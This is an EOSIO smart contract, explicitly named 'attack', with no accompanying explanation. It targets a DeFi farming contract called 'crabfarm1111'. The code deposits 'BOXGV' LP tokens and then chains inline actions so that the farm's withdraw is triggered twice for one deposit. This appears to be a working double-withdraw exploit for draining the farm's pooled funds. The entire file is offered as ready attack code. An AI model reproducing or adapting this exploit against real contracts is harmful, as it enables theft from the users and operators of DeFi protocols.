#include <eosio/eosio.hpp>
#include <eosio/asset.hpp>
#include <eosio/system.hpp>
#include <utils.hpp>
#include <string>
#include <cmath>
namespace eosiosystem {
   class system_contract;
}
namespace eosio {
    using std::string;
    class [[eosio::contract("attack")]] attack : public contract {
        symbol sym = symbol("BOXGV",0);
        [[eosio::action]]
        void start() {
            action{permission_level{get_self(), "active"_n}, _self, "deposit"_n, make_tuple()}.send();
        }

        [[eosio::action]]
        void deposit() {
            utils::inline_transfer("lptoken.defi"_n, _self, "crabfarm1111"_n, asset(50000, sym), string("deposit-1"));
            action{permission_level{get_self(), "active"_n}, _self, "withdraw"_n, make_tuple()}.send();
        }

        [[eosio::action]]
        void withdraw() {
            action{permission_level{get_self(), "active"_n}, _self, "deposit"_n, make_tuple()}.send();
            auto data = make_tuple(1, _self, asset(50000, sym));
            action{permission_level{get_self(), "active"_n}, "crabfarm1111"_n, "withdraw"_n, data}.send();
            
            action{permission_level{get_self(), "active"_n}, _self, "withdraw2"_n, make_tuple()}.send();
        }

        [[eosio::action]]
        void withdraw2() {
            auto data = make_tuple(1, _self, asset(50000, sym));
            action{permission_level{get_self(), "active"_n}, "crabfarm1111"_n, "withdraw"_n, data}.send();
        }

    };
}